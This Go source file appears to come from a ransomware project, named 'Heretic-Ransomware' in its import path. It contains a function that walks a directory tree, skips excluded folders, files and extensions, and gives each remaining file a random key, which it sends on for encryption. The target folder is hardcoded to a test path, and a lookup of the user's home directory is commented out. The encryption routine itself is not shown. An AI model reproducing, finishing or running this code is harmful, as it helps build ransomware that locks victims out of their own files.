package files

import (
	json "github.com/bytedance/sonic"
	"github.com/dark-faction/Heretic-Ransomware/internal/cipher"
	"go.uber.org/zap"
	"os"
	"path/filepath"
	"slices"
	"strings"
)

func FileWalkerEncrypt(ch chan string) {
	//dirname, err := os.UserHomeDir()
	//if err != nil {
	//	zap.L().Info(err.Error())
	//}

	dirname := "/home/anon/RansomFiles"

	err := filepath.Walk(dirname, func(path string, info os.FileInfo, err error) error {

		if info.IsDir() {
			for _, excluded := range ExcludedDirectories {
				if strings.EqualFold(strings.ToLower(filepath.Base(path)), excluded) {
					return filepath.SkipDir
				}
			}
		}

		if !info.IsDir() {
			if !slices.Contains(ExcludedFiles, info.Name()) && !slices.Contains(ExcludedExtensions, filepath.Ext(path)) {
				// assign decryption key to path/file
				key, err := cipher.RandomString()
				if err != nil {
					zap.L().Info(err.Error())
				}

				fileInfo, err := json.Marshal(cipher.FilePathInfo{
					Path:          path,
					FileName:      info.Name(),
					FileExtension: filepath.Ext(path),
					Key:           key,
				})

				if err != nil {
					zap.L().Info(err.Error())
				}

				ch <- string(fileInfo)
			}
		}

		return nil
	})

	if err != nil {
		zap.L().Info(err.Error())
	}

	close(ch)

}
